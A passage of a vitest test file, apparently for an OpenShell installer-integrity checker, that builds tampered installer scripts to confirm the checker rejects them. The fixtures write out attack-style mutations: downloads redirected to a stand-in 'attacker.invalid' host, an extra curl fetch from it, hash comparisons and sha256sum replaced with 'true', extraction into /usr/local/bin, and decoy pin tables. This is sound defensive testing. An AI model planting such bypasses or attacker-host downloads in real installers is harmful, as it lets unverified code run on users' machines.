// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { afterEach, describe, expect, it } from "vitest";

import {
  V0099_ASSET_DIGESTS,
  V0099_CHECKSUM_MANIFESTS,
  V00101_ASSET_DIGESTS,
  V00101_CHECKSUM_MANIFESTS,
  V00101_SANDBOX_BUILD_DIGESTS,
  V00103_ASSET_DIGESTS,
  V00103_CHECKSUM_MANIFESTS,
  V00103_SANDBOX_BUILD_DIGESTS,
  V00103_SUPERVISOR_MANIFEST_DIGEST,
  V00106_ASSET_DIGESTS,
  V00106_CHECKSUM_MANIFESTS,
  V00106_SANDBOX_BUILD_DIGESTS,
  V00106_SUPERVISOR_MANIFEST_DIGEST,
} from "../helpers/openshell-release-fixtures";

const REPO_ROOT = path.join(import.meta.dirname, "../..");
const INSTALLER_TEMPLATE = fs.readFileSync(
  path.join(REPO_ROOT, "scripts/install-openshell.sh"),
  "utf8",
);
const BREV_TEMPLATE = fs.readFileSync(
  path.join(REPO_ROOT, "scripts/brev-launchable-ci-cpu.sh"),
  "utf8",
);
const SUPERVISOR_RUNTIME_TEMPLATE = fs.readFileSync(
  path.join(REPO_ROOT, "src/lib/onboard/docker-driver-gateway-runtime.ts"),
  "utf8",
);
const ASSET_DIGESTS = new Map([
  [
    "openshell-x86_64-unknown-linux-musl.tar.gz",
    "37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4",
  ],
  [
    "openshell-aarch64-unknown-linux-musl.tar.gz",
    "a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045",
  ],
  [
    "openshell-aarch64-apple-darwin.tar.gz",
    "117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d",
  ],
  [
    "openshell-gateway-x86_64-unknown-linux-gnu.tar.gz",
    "03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877",
  ],
  [
    "openshell-gateway-aarch64-unknown-linux-gnu.tar.gz",
    "a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108",
  ],
  [
    "openshell-gateway-aarch64-apple-darwin.tar.gz",
    "8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb",
  ],
  [
    "openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz",
    "811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230",
  ],
  [
    "openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz",
    "2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0",
  ],
  ["openshell.rb", "4b75a7e3a7630eb8954d73ca828b394d5e0646adbaa4b087b2435329d53b61b3"],
]);
const FORMULA_ASSET = "openshell.rb";
const FORMULA_DIGEST = ASSET_DIGESTS.get(FORMULA_ASSET)!;
const SYNTHETIC_SUPERVISOR_MANIFEST_DIGEST = `sha256:${"c".repeat(64)}`;
const SYNTHETIC_SANDBOX_BUILD_DIGESTS = ["a".repeat(64), "b".repeat(64)] as const;
const ASSETS = [...ASSET_DIGESTS.keys()].filter((asset) => asset !== FORMULA_ASSET);
const INSTALLER_ASSETS = [...ASSETS, FORMULA_ASSET];
const UNPUBLISHED_ASSET = "openshell-sandbox-aarch64-unknown-linux-gnu-unpublished.tar.gz";
const OFFICIAL_UNEXPECTED_INSTALLER_ASSET = "openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz";
const OFFICIAL_UNEXPECTED_INSTALLER_DIGEST =
  "911dd804074c620b3ba353f17e39a8195222c0764072621a154164432d7906d0";
const OFFICIAL_UNEXPECTED_BREV_ASSET = "openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz";
const OFFICIAL_UNEXPECTED_BREV_DIGEST =
  "5e6ba04030938e7be21b8b83af9a34b888deffb4c65e7e70dd6845c3bc7e264f";
const SYMLINK_INPUT_MARKER = "LEAK565";
type FixtureMode =
  | "allowlisted-alternate-version"
  | "brev-bypassed-comparison"
  | "brev-changed-asset"
  | "brev-changed-extraction-target"
  | "brev-changed-url"
  | "brev-comment-decoy"
  | "brev-dead-code-decoy"
  | "brev-decoy-table"
  | "brev-bypassed-verifier-call"
  | "brev-extra-download"
  | "brev-indirect-selector-override"
  | "brev-later-selector-override"
  | "brev-literalized-pin-selector"
  | "brev-mismatch"
  | "brev-sha-command-bypass"
  | "complete"
  | "complete-multiple-installer-versions"
  | "duplicate-brev-pin"
  | "duplicate-installer-pin"
  | "failure"
  | "formula-mismatch"
  | "formula-pin-mismatch"
  | "formula-self-authorized"
  | "incomplete-trusted-allowlist"
  | "installer-max-version-drift"
  | "installer-bypassed-comparison"
  | "installer-changed-asset"
  | "installer-changed-checksum"
  | "installer-changed-extraction-target"
  | "installer-changed-url"
  | "installer-comment-decoy"
  | "installer-dead-code-decoy"
  | "installer-decoy-table"
  | "installer-dev-min-version-drift"
  | "installer-extra-download"
  | "installer-indirect-selector-override"
  | "installer-later-min-selector-override"
  | "installer-later-selector-override"
  | "installer-literalized-pin-input"
  | "installer-min-version-drift"
  | "installer-homebrew-untrust-cleanup-drift"
  | "installer-homebrew-trust-transition-drift"
  | "installer-homebrew-trust-transition-stable-leak"
  | "installer-homebrew-trust-transition-complete-current"
  | "installer-pin-selector-drift"
  | "installer-sha-command-bypass"
  | "mismatched-table-versions"
  | "missing-brev-pin"
  | "missing-trusted-formula"
  | "malformed-trusted-formula"
  | "mismatched-trusted-formula-url"
  | "multiple-installer-versions"
  | "non-regular-brev-input"
  | "official-but-unexpected-brev-asset"
  | "official-but-unexpected-installer-asset"
  | "oversized-installer-input"
  | "partial"
  | "partial-asset-missing"
  | "partial-manifest-missing"
  | "pr-checker-bypass"
  | "pr-parser-bypass"
  | "brev-stable-version-drift"
  | "runtime-consumers-newer-than-tables"
  | "reviewed-release-cohorts"
  | "reviewed-release-cohorts-url-drift"
  | "secondary-installer-version-mismatch"
  | "symlink-installer-input"
  | "symlink-scripts-parent"
  | "duplicate-trusted-release"
  | "trusted-formula-mismatch";
type PinFormatting =
  | "canonical"
  | "comments"
  | "equals-whitespace"
  | "line-continuations"
  | "mixed-whitespace"
  | "quote-styles";

const corruptFirstBrevPin = (source: string): string =>
  source.replace(ASSET_DIGESTS.get(ASSETS[0]) ?? "missing", "0".repeat(64));
const BREV_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "brev-bypassed-comparison": (source) =>
    source.replace('[[ "$release_sha" == "$expected_sha" ]]', "true"),
  "brev-changed-asset": (source) =>
    source.replace(
      'openshell-x86_64-unknown-linux-musl.tar.gz" ;;',
      'openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz" ;;',
    ),
  "brev-changed-extraction-target": (source) =>
    source.replace(
      'tar xzf "$tmpdir/$asset" -C "$tmpdir"',
      'tar xzf "$tmpdir/$asset" -C /usr/local/bin',
    ),
  "brev-changed-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/${OPENSHELL_VERSION}/${asset}",
      "https://attacker.invalid/openshell/${OPENSHELL_VERSION}/${asset}",
    ),
  "brev-comment-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
    const comparison = '[[ "$release_sha" == "$expected_sha" ]]';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
  },
  "brev-dead-code-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"')}\nif false; then\n  ${lookup}\nfi\n`;
  },
  "brev-decoy-table": (source) =>
    source.replace(
      'openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
      'attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
    ),
  "brev-bypassed-verifier-call": (source) =>
    source.replace('verify_openshell_cli_asset "$tmpdir" "$asset"', ":"),
  "brev-extra-download": (source) => `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
  "brev-indirect-selector-override": (source) =>
    `${source}\nselector=OPENSHELL_VERSION\ndeclare "$selector=v9.9.9"\n`,
  "brev-later-selector-override": (source) => `${source}\nOPENSHELL_VERSION="v9.9.9"\n`,
  "brev-literalized-pin-selector": (source) =>
    source.replace('case "${release_tag}:${asset}" in', "case '${release_tag}:${asset}' in"),
  "brev-mismatch": corruptFirstBrevPin,
  "brev-sha-command-bypass": (source) => source.replace("sha_cmd=(sha256sum)", "sha_cmd=(true)"),
  "duplicate-brev-pin": (source) => {
    const pinLine = `      printf '%s\\n' "${ASSET_DIGESTS.get(ASSETS[0])}"`;
    return source.replace(pinLine, `${pinLine}\n${pinLine}`);
  },
  "missing-brev-pin": (source) =>
    source.replace(ASSET_DIGESTS.get(ASSETS[1]) ?? "missing", "missing"),
  "mismatched-table-versions": (source) => source.replaceAll("v0.0.72:", "v0.0.73:"),
  "official-but-unexpected-brev-asset": (source) =>
    source
      .replace(`v0.0.72:${ASSETS[1]})`, `v0.0.72:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
      .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
  "pr-checker-bypass": corruptFirstBrevPin,
  "pr-parser-bypass": corruptFirstBrevPin,
  "brev-stable-version-drift": (source) =>
    source.replace(
      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
    ),
  "runtime-consumers-newer-than-tables": (source) =>
    source.replace(
      'stable | auto) OPENSHELL_VERSION="v0.0.72" ;;',
      'stable | auto) OPENSHELL_VERSION="v0.0.85" ;;',
    ),
};
const mutateSandboxBuildFunction = (
  source: string,
  mutate: (functionSource: string) => string,
): string => {
  const start = source.indexOf("pinned_sandbox_build_version() {");
  const end = source.indexOf("\ncomponent_build_version() {", start);
  assert.notEqual(start, -1, "sandbox build function start marker must exist");
  assert.notEqual(end, -1, "sandbox build function end marker must exist");
  const functionSource = source.slice(start, end);
  const mutated = mutate(functionSource);
  assert.notEqual(
    mutated,
    functionSource,
    "sandbox build fixture mutation must change the function",
  );
  return `${source.slice(0, start)}${mutated}${source.slice(end)}`;
};

const addSandboxBuildPins = (
  source: string,
  version: string,
  digests: readonly [string, string],
): string =>
  mutateSandboxBuildFunction(source, (functionSource) =>
    functionSource.replace(
      "    *)",
      `    ${digests[0]} | \\
      ${digests[1]})
      printf '%s\\n' "${version}"
      ;;
    *)`,
    ),
  );

const INSTALLER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "duplicate-installer-pin": (source) => {
    const asset = ASSETS[0];
    const digest = ASSET_DIGESTS.get(asset ?? "") ?? "missing";
    const arm = `    v0.0.72:${asset})
      printf '%s\\n' "${digest}"
      ;;`;
    assert.ok(source.includes(arm), "installer duplicate-pin fixture arm must exist");
    return source.replace(arm, `${arm}\n${arm}`);
  },
  "formula-pin-mismatch": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
  "formula-self-authorized": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
  "installer-bypassed-comparison": (source) =>
    source.replace('[ "$release_sha" = "$expected_sha" ]', "true"),
  "installer-changed-asset": (source) =>
    source.replace(
      'ASSETS+=("openshell-gateway-x86_64-unknown-linux-gnu.tar.gz")',
      'ASSETS+=("openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz")',
    ),
  "installer-changed-checksum": (source) =>
    source.replace(
      'CHECKSUM_FILES+=("openshell-sandbox-checksums-sha256.txt")',
      'CHECKSUM_FILES+=("openshell-checksums-sha256.txt")',
    ),
  "installer-changed-extraction-target": (source) =>
    source.replace(
      'tar xzf "$tmpdir/$asset_name" -C "$tmpdir"',
      'tar xzf "$tmpdir/$asset_name" -C /usr/local/bin',
    ),
  "installer-changed-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/${RELEASE_TAG}/$name",
      "https://attacker.invalid/openshell/${RELEASE_TAG}/$name",
    ),
  "installer-comment-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
    const comparison = '[ "$release_sha" = "$expected_sha" ]';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
  },
  "installer-dead-code-decoy": (source) => {
    const lookup = 'expected_sha="$(openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name")"';
    return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name")"')}\nif false; then\n  ${lookup}\nfi\n`;
  },
  "installer-decoy-table": (source) =>
    source.replace(
      'openshell_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
      'attacker_pinned_sha256 "$RELEASE_TAG" "$asset_name"',
    ),
  "installer-dev-min-version-drift": (source) =>
    source.replace('DEV_MIN_VERSION="0.0.72"', 'DEV_MIN_VERSION="0.0.85"'),
  "installer-extra-download": (source) =>
    `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
  "installer-indirect-selector-override": (source) =>
    `${source}\nselector=RELEASE_TAG\ndeclare "$selector=v9.9.9"\n`,
  "installer-later-min-selector-override": (source) => `${source}\nMIN_VERSION="9.9.9"\n`,
  "installer-later-selector-override": (source) => `${source}\nPIN_VERSION="9.9.9"\n`,
  "installer-literalized-pin-input": (source) =>
    source.replace('local release_tag="$1" asset="$2"', "local release_tag='$1' asset='$2'"),
  "installer-min-version-drift": (source) =>
    source.replace('MIN_VERSION="0.0.72"', 'MIN_VERSION="0.0.85"'),
  "installer-homebrew-trust-transition-complete-current": (source) =>
    source.replace(
      "readonly OPENSHELL_HOMEBREW_FORMULA_ABSENT=65",
      "readonly OPENSHELL_HOMEBREW_FORMULA_ABSENT=64",
    ),
  "installer-homebrew-trust-transition-drift": (source) =>
    source.replace(
      'brew trust --formula "$formula_ref" >/dev/null 2>&1 \\',
      "brew trust nvidia/openshell >/dev/null 2>&1 \\",
    ),
  "installer-homebrew-untrust-cleanup-drift": (source) =>
    source.replace(
      'exit "$OPENSHELL_HOMEBREW_UNTRUST_FAILED"',
      'status="$OPENSHELL_HOMEBREW_UNTRUST_FAILED"',
    ),
  "installer-homebrew-trust-transition-stable-leak": (source) =>
    source.replace(
      'if [ "$trust_active" = "1" ] && ! brew untrust --formula "$formula_ref" >/dev/null 2>&1; then',
      "if false; then",
    ),
  "installer-max-version-drift": (source) =>
    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
  "installer-pin-selector-drift": (source) =>
    source.replace('PIN_VERSION="$MAX_VERSION"', 'PIN_VERSION="0.0.72"'),
  "installer-sha-command-bypass": (source) =>
    source.replace('SHA_CMD="sha256sum"', 'SHA_CMD="true"'),
  "multiple-installer-versions": (source) =>
    source.replace(`v0.0.72:${ASSETS[0]}`, `v0.0.73:${ASSETS[0]}`),
  "official-but-unexpected-installer-asset": (source) =>
    source
      .replace(ASSETS.at(-1) ?? "missing", OFFICIAL_UNEXPECTED_INSTALLER_ASSET)
      .replace(
        ASSET_DIGESTS.get(ASSETS.at(-1) ?? "") ?? "missing",
        OFFICIAL_UNEXPECTED_INSTALLER_DIGEST,
      ),
  "partial-asset-missing": (source) =>
    source.replace(ASSETS.at(-1) ?? "missing", UNPUBLISHED_ASSET),
  "runtime-consumers-newer-than-tables": (source) =>
    source.replace('MAX_VERSION="0.0.72"', 'MAX_VERSION="0.0.85"'),
};

function addInstallerReleaseTable(
  source: string,
  version: string,
  assetDigests: ReadonlyMap<string, string>,
): string {
  const functionStart = source.indexOf("openshell_pinned_sha256() {");
  const fallback = "    *)\n      return 1\n      ;;";
  const fallbackStart = source.indexOf(fallback, functionStart);
  expect(functionStart, "installer pin function start").not.toBe(-1);
  expect(fallbackStart, "installer pin function fallback").not.toBe(-1);
  const cases = INSTALLER_ASSETS.map((asset) => {
    const digest = assetDigests.get(asset) ?? "missing";
    return `    v${version}:${asset})
      printf '%s\\n' "${digest}"
      ;;`;
  }).join("\n");
  return `${source.slice(0, fallbackStart)}${cases}\n${source.slice(fallbackStart)}`;
}

function applyReviewedReleaseCohorts(source: string): string {
  const currentComment = `# regressionTest: test/install/install-openshell-version-check.test.ts exercises all
# nine mappings, and scripts/check-installer-hash.sh compares them with the
# GitHub release API on every PR, main push, weekly run, and manual dispatch.
# removalCondition: remove these entries only when NemoClaw drops that
# supported release or replaces them with independently verified newer pins.`;
  const reviewedComment = `# OpenShell 0.0.101 is the supported product cohort. OpenShell 0.0.106 is the
# qualification-only cohort. The base-trusted verifier validates each complete
# nine-asset release cohort independently against GitHub release metadata.
# removalCondition: remove a cohort when its product support or qualification
# ends, or replace it with an independently verified release cohort.`;
  expect(source.includes(currentComment) || source.includes(reviewedComment)).toBe(true);
  return addInstallerReleaseTable(
    source.replace(currentComment, reviewedComment),
    "0.0.106",
    V00106_ASSET_DIGESTS,
  );
}

INSTALLER_MUTATIONS["reviewed-release-cohorts"] = applyReviewedReleaseCohorts;
INSTALLER_MUTATIONS["reviewed-release-cohorts-url-drift"] = (source) =>
  applyReviewedReleaseCohorts(source).replace(
    "https://github.com/NVIDIA/OpenShell/releases/download/${RELEASE_TAG}/$name",
    "https://attacker.invalid/openshell/${RELEASE_TAG}/$name",
  );

for (const mode of [
  "complete-multiple-installer-versions",
  "secondary-installer-version-mismatch",
] as const) {
  INSTALLER_MUTATIONS[mode] = (source) => {
    const withSecondRelease = addInstallerReleaseTable(source, "0.0.106", V00106_ASSET_DIGESTS);
    return mode === "secondary-installer-version-mismatch"
      ? withSecondRelease.replace(
          `v0.0.106:${ASSETS[0]})
      printf '%s\\n' "${V00106_ASSET_DIGESTS.get(ASSETS[0]) ?? "missing"}"`,
          `v0.0.106:${ASSETS[0]})
      printf '%s\\n' "${"0".repeat(64)}"`,
        )
      : withSecondRelease;
  };
}

type InputMutationContext = {
  blueprint: string;
  brevInstaller: string;
  fixtureRoot: string;
  installer: string;
};
const INPUT_MUTATIONS: Partial<Record<FixtureMode, (context: InputMutationContext) => void>> = {
  "runtime-consumers-newer-than-tables": ({ blueprint }) => {
    const source = fs.readFileSync(blueprint, "utf8");
    fs.writeFileSync(blueprint, source.replace('"0.0.72"', '"0.0.85"'));
  },
  "non-regular-brev-input": ({ brevInstaller }) => {
    fs.rmSync(brevInstaller);
    fs.mkdirSync(brevInstaller);
  },
  "oversized-installer-input": ({ installer }) => {
    fs.appendFileSync(installer, `\n# ${"x".repeat(1024 * 1024)}\n`);
  },
  "symlink-installer-input": ({ fixtureRoot, installer }) => {
    const symlinkTarget = path.join(fixtureRoot, "valid-installer-target.sh");
    fs.renameSync(installer, symlinkTarget);
    fs.writeFileSync(symlinkTarget, `""\n${SYMLINK_INPUT_MARKER}\n`);
    fs.symlinkSync(symlinkTarget, installer);
  },
  "symlink-scripts-parent": ({ fixtureRoot }) => {
    const candidateScriptsDir = path.join(fixtureRoot, "scripts");
    const scriptsTarget = path.join(fixtureRoot, "candidate-scripts-target");
    fs.renameSync(candidateScriptsDir, scriptsTarget);
    fs.writeFileSync(
      path.join(scriptsTarget, "install-openshell.sh"),
      `""\n${SYMLINK_INPUT_MARKER}\n`,
    );
    fs.symlinkSync(scriptsTarget, candidateScriptsDir, "dir");
  },
};
const CHECKSUM_MANIFESTS = new Map([
  [
    "openshell-checksums-sha256.txt",
    `37836c3b50383e03249c5e16512c1806e591fba8451408a84fb2f628ddb318c4  openshell-x86_64-unknown-linux-musl.tar.gz
a5ff01a3240d73c72ec1700eda6cc6c752a86cf50c5dd1b5bdc459f544d03045  openshell-aarch64-unknown-linux-musl.tar.gz
117b5354cc42d80bc4d5e070ea5ac4e341208ff6d3c29b516d8a9c80e2310f8d  openshell-aarch64-apple-darwin.tar.gz
911dd804074c620b3ba353f17e39a8195222c0764072621a154164432d7906d0  openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz
5e6ba04030938e7be21b8b83af9a34b888deffb4c65e7e70dd6845c3bc7e264f  openshell-driver-vm-aarch64-unknown-linux-gnu.tar.gz
cdcdf0d0b5a231c0c7631787de014462093ffdeb5c85de853594fd215b0fa98a  openshell-driver-vm-aarch64-apple-darwin.tar.gz
f4807cdaf3598c1fbcd0f35c888bf7f42210e1f4ab27700a1200d5bf80e56e9a  openshell_0.0.72-1_amd64.deb
e38eca3badbba827c7342e2d738b277c8714081a54700ce4dc6c5395e1608d6b  openshell_0.0.72-1_arm64.deb
626aa3c781027231a2085ebbdb5a4e2ae88c1c0977bfb1fd7ddaab501efe37c5  openshell-0.0.72-1.fc44.aarch64.rpm
abca83026aa8192a82c54316e6f15f38583fdd59d936535d07fe7bb5e6824a32  openshell-0.0.72-1.fc44.x86_64.rpm
cf349d3cd5fb5f05419ee088a4784206ce117af07f427e0667290955659c7530  openshell-gateway-0.0.72-1.fc44.aarch64.rpm
523087b888d6641a1798c3400492028d5c236870f321ab87d28918e3ae523c20  openshell-gateway-0.0.72-1.fc44.x86_64.rpm
fc590490e1a89c00b8f95b5449de9107cb9f070bd4a8cefb0f2389baf0d95f67  openshell-0.0.72-py3-none-macosx_13_0_arm64.whl
e104152e6840dc2bed10856251ed6b3a020ed5f5550e735a325028a0990b475b  openshell-0.0.72-py3-none-manylinux_2_39_aarch64.whl
c7feaca0c8c97ace952bd047408a91732fbcb298517481152d8e53d49c5fc88f  openshell-0.0.72-py3-none-manylinux_2_39_x86_64.whl
`,
  ],
  [
    "openshell-gateway-checksums-sha256.txt",
    `03225fb9388b682af1a5f1614b26b75f828da6031e3ffc1fd920b6fbe5f70877  openshell-gateway-x86_64-unknown-linux-gnu.tar.gz
a97dcb3acb04fb2d1170c1a2170228990c2337e25bb8c18817e5a6e952204108  openshell-gateway-aarch64-unknown-linux-gnu.tar.gz
8c07362107393eb5f4ae4b9ee9f4257fd53862c51ad8dd96f2fe31bb6d8d7ffb  openshell-gateway-aarch64-apple-darwin.tar.gz
`,
  ],
  [
    "openshell-sandbox-checksums-sha256.txt",
    `811f914b6a6a3a3f4533449ddebebb6422333861a27a5fa848db6cbfdffdd230  openshell-sandbox-x86_64-unknown-linux-gnu.tar.gz
2cf62cbd651e55d0f8750804e2b4025e0d6c8eea4564c87cda47a2c922941db0  openshell-sandbox-aarch64-unknown-linux-gnu.tar.gz
`,
  ],
]);
const CHECKSUM_MANIFESTS_BY_VERSION = new Map([
  ["0.0.99", V0099_CHECKSUM_MANIFESTS],
  ["0.0.101", V00101_CHECKSUM_MANIFESTS],
  ["0.0.103", V00103_CHECKSUM_MANIFESTS],
  ["0.0.106", V00106_CHECKSUM_MANIFESTS],
]);
const ASSET_DIGESTS_BY_VERSION = new Map([
  ["0.0.99", V0099_ASSET_DIGESTS],
  ["0.0.101", V00101_ASSET_DIGESTS],
  ["0.0.103", V00103_ASSET_DIGESTS],
  ["0.0.106", V00106_ASSET_DIGESTS],
]);
const trustAlternateRelease = (source: string): string => {
  const digests = SYNTHETIC_SANDBOX_BUILD_DIGESTS;
  const manifests = [...CHECKSUM_MANIFESTS.entries()]
    .map(
      ([asset, contents]) => `      {
        asset: "${asset}",
        sha256: "${createHash("sha256").update(contents).digest("hex")}",
      },`,
    )
    .join("\n");
  const marker = "const TRUSTED_OPENSHELL_RELEASES: readonly OpenShellReleaseTrust[] = [\n";
  const result = source.replace(
    marker,
    `${marker}  {
    brevTemplateSha256: [
      "c0a4ddf25a02a9fe02b2df53a60942ea887610f04d4ce16a121b6e79a5aeff1a",
    ],
    formula: {
      asset: "openshell.rb",
      sha256: "${FORMULA_DIGEST}",
      url: "https://github.com/NVIDIA/OpenShell/releases/download/v9.9.9/openshell.rb",
    },
    installerTemplateSha256: [
      "c3418c0837c450df89ca1b6ca3a598cdee47b0d30e2c2433fd7732ec35c2ccc2",
    ],
    manifests: [
${manifests}
    ],
    sandboxBuilds: [
      { required: false, sha256: "${digests[0]}" },
      { required: false, sha256: "${digests[1]}" },
    ],
    supervisor: {
      image: "ghcr.io/nvidia/openshell/supervisor",
      manifestDigest: "${SYNTHETIC_SUPERVISOR_MANIFEST_DIGEST}",
      required: false,
      runtimeTemplateSha256: [
        "c1922eaa4f73c1a05aa8bccf50fc40208d7f71db0e6c110dcd09d0372d1aa068",
      ],
    },
    version: "9.9.9",
  },
`,
  );
  expect(result, "alternate release trust anchor").not.toBe(source);
  return result;
};
const removeFirstReleaseFormula = (source: string): string =>
  source.replace(
    /    formula: \{\n      asset: "openshell\.rb",\n      sha256: "[a-f0-9]{64}",\n      url: "https:\/\/github\.com\/NVIDIA\/OpenShell\/releases\/download\/v0\.0\.72\/openshell\.rb",\n    \},/u,
    "    formula: undefined as never,",
  );
const PARSER_MUTATIONS: Partial<Record<FixtureMode, (source: string) => string>> = {
  "allowlisted-alternate-version": trustAlternateRelease,
  "duplicate-trusted-release": (source) =>
    source.replace('    version: "0.0.82",', '    version: "0.0.72",'),
  "incomplete-trusted-allowlist": (source) =>
    source.replace(
      /      \{\n        asset: "openshell-sandbox-checksums-sha256\.txt",\n        sha256: "d38507501338576437cf3e554df71fefe927dc0d72758f88e260069527ed9ccc",\n      \},/u,
      "",
    ),
  "malformed-trusted-formula": (source) => source.replace(FORMULA_DIGEST, "invalid"),
  "mismatched-trusted-formula-url": (source) =>
    source.replace(
      "https://github.com/NVIDIA/OpenShell/releases/download/v0.0.72/openshell.rb",
      "https://attacker.invalid/openshell.rb",
    ),
  "missing-trusted-formula": removeFirstReleaseFormula,
  "trusted-formula-mismatch": (source) => source.replace(FORMULA_DIGEST, "0".repeat(64)),
};
const tempDirs: string[] = [];

afterEach(() => {
  for (const tempDir of tempDirs.splice(0)) {
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
});

function renderPinFunction(
  functionName: string,
  assets: string[],
  openshellVersion: string,
  formatting: PinFormatting,
  assetDigests = ASSET_DIGESTS,
): string {
  const functionOpening =
    formatting === "mixed-whitespace" ? `${functionName}\t( )\t{` : `${functionName}() {`;
  const localInputs =
    formatting === "equals-whitespace"
      ? '  local release_tag = "$1" asset = "$2"'
      : formatting === "mixed-whitespace"
        ? '\tlocal\trelease_tag="$1"\tasset="$2"'
        : '  local release_tag="$1" asset="$2"';
  const caseOpening =
    formatting === "mixed-whitespace"
      ? '\tcase\t"${release_tag}:${asset}"\tin'
      : '  case "${release_tag}:${asset}" in';
  const cases = assets
    .map((asset) => {
      const digest = assetDigests.get(asset) ?? "missing";
      const pattern =
        formatting === "quote-styles"
          ? `    'v${openshellVersion}:${asset}')`
          : formatting === "mixed-whitespace"
            ? `\t  v${openshellVersion}:${asset}\t)`
            : `    v${openshellVersion}:${asset})`;
      const patternLine = formatting === "comments" ? `${pattern} # exact asset` : pattern;
      const printfLine =
        formatting === "line-continuations"
          ? `      printf \\
        '%s\\n' \\
        "${digest}"`
          : formatting === "quote-styles"
            ? `      printf "%s\\n" '${digest}'`
            : formatting === "mixed-whitespace"
              ? `\t\tprintf\t'%s\\n'\t"${digest}"`
              : `      printf '%s\\n' "${digest}"`;
      const commentedPrintf =
        formatting === "comments" ? `${printfLine} # published SHA-256` : printfLine;
      const terminator = formatting === "mixed-whitespace" ? "\t\t;;" : "      ;;";
      return `${patternLine}\n${commentedPrintf}\n${terminator}`;
    })
    .join("\n");
  return `${functionOpening}\n${localInputs}\n${caseOpening}\n${cases}\n    *)\n      return 1\n      ;;\n  esac\n}\n`;
}

function replacePinFunction(
  source: string,
  functionName: string,
  nextMarker: string,
  replacement: string,
): string {
  const start = source.indexOf(`${functionName}() {`);
  const next = source.indexOf(`\n${nextMarker}`, start);
  expect(start, `${functionName} template start`).not.toBe(-1);
  expect(next, `${functionName} template end`).not.toBe(-1);
  return `${source.slice(0, start)}${replacement}${source.slice(next)}`;
}

function addV00106OperationalTrust(source: string): string {
  const withIdentityCheck = source.replace(
    "pinned_sandbox_build_version() {",
    `is_pinned_openshell_v00106_linux_x86_64_install() {
  local openshell_bin="$1"
  local gateway_bin="$2"
  local sandbox_bin="$3"
  local openshell_sha gateway_sha sandbox_sha

  [ "$OS" = "Linux" ] && [ "$ARCH_LABEL" = "x86_64" ] || return 1
  openshell_sha="$(file_sha256 "$openshell_bin")" || return 1
  gateway_sha="$(file_sha256 "$gateway_bin")" || return 1
  sandbox_sha="$(file_sha256 "$sandbox_bin")" || return 1
  [ "$openshell_sha" = "98ecf95113fea999e94a928043e57b04cf58a45a1b66ae8bffc73d1bc8bb1d59" ] \\
    && [ "$gateway_sha" = "e6cde8a54568aa1926ff6584ffd6984314c68dad64d2722509618a74094c622c" ] \\
    && [ "$sandbox_sha" = "019301ec8618abbed8135e8d39dde7bea47e5e92813bbc17768550de34db59f8" ]
}

pinned_sandbox_build_version() {`,
  );
  const capabilityMarker = "  # OpenShell #1865 has no authoritative CLI/RPC capability query yet.";
  const result = withIdentityCheck.replace(
    capabilityMarker,
    `  # The v0.0.106 release binaries are stripped and no longer retain every
  # source-level capability marker used by the development-build fallback
  # below. Accept only the reviewed executable byte identities as the stable
  # release capability proof; arbitrary binaries that merely report 0.0.106
  # must still pass the fail-closed marker checks.
  if is_pinned_openshell_v00106_linux_x86_64_install \\
    "$openshell_bin" "$gateway_bin" "$sandbox_bin"; then
    return 0
  fi

